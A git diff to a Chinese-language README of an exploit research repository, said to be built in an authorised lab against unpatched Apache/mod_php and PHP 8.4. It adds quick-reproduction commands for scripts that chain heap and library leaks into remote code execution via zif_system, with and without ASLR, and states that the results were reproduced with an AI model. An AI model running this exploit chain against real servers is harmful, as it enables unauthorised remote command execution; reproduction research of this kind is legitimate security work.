@@ -3,6 +3,30 @@
 本仓库记录在**授权实验环境**中，对 Debian 12 + Apache 2.4.68 prefork +
 mod_php + PHP 8.4.26（官方源码自编译、未打补丁）的一组漏洞复现与利用研究。
 
+> **复线声明**：本仓库全部成果均使用 **deepseek-v4-flash** 复线（复现验证）。
+
+## 快速复现
+
+以下命令在目标机（Apache/mod_php 本机）的仓库目录执行，脚本默认连接
+`127.0.0.1:8088`。no-ASLR 地址与各阶段偏移绑定本实验构建，换环境需重新校准。
+
+```bash
+# 1) no-ASLR 纯 HTTP RCE（需 display_errors=On，两个请求）
+python3 tools/send_a_ps.py 17 19 3 12
+python3 tools/send_b_rce2.py 7 2 0x7ffff5e6e0d8 0x7ffff7d13490 "id>/tmp/p1"
+
+# 2) ASLR-on 全链（堆泄漏 → libphp 泄漏 → zif_system，含纯 HTTP 轮换）
+CMD="id>/tmp/p1" bash tools/pure_aslr_run.sh
+
+# 3) display_errors=0 堆泄漏（需 gdb；A-only 与 A+B forge）
+./tools/trial_bins.sh 0 62 235 15000 208 0 4000 103
+BN=160 BVL=231 BB1_LEN=1048551 BF_P1=256 BF_READ=4000 \
+  ./tools/trial_ab.sh 0 62 235 15000 208 0 4000 103
+```
+
+> 步骤 3 的 `trial_*.sh` 会重启本机 Apache 并挂 gdb，仅用于校准/取证；
+> 实际攻击请求本身仍是普通 multipart HTTP。
+
 约束：
 
 - 攻击请求**只用普通 multipart HTTP**；
